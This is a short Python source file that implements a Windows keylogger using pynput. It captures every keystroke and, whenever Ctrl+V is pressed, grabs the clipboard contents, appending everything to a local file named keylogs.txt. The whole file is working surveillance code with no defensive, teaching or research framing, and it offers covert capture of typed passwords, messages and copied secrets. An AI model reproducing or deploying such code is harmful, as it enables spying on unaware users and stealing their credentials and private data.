from pynput.keyboard import Key, Listener
import ctypes
import win32clipboard

keytochar = {Key.enter: '\n', Key.backspace: '\b', Key.space: ' ', Key.delete: '\b', Key.tab: '\t'}
keytoflag = {Key.ctrl_r: 1, Key.ctrl_l: 1, Key.alt_r: 2, Key.alt_l: 2, Key.shift_r: 3, Key.shift: 3, Key.caps_lock: 4, Key.esc: 5}
hllDll = ctypes.WinDLL("User32.dll")


def add_data(x):
    print(x)
    f = open("keylogs.txt", "a")
    f.write(x)
    f.close()


def on_press(key):
    print(str(key))
    if str(key).encode() == b"'\\x16'":  # paste
        win32clipboard.OpenClipboard()
        x = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        add_data(x)

    elif len(str(key)) == 3:
        x = format(key.char)
        add_data(x)

    elif key in keytochar:
        x = keytochar.get(key)
        add_data(x)


def start_keylogger():
    # Collect events until released
    with Listener(on_press=on_press) as listener:
        listener.join()
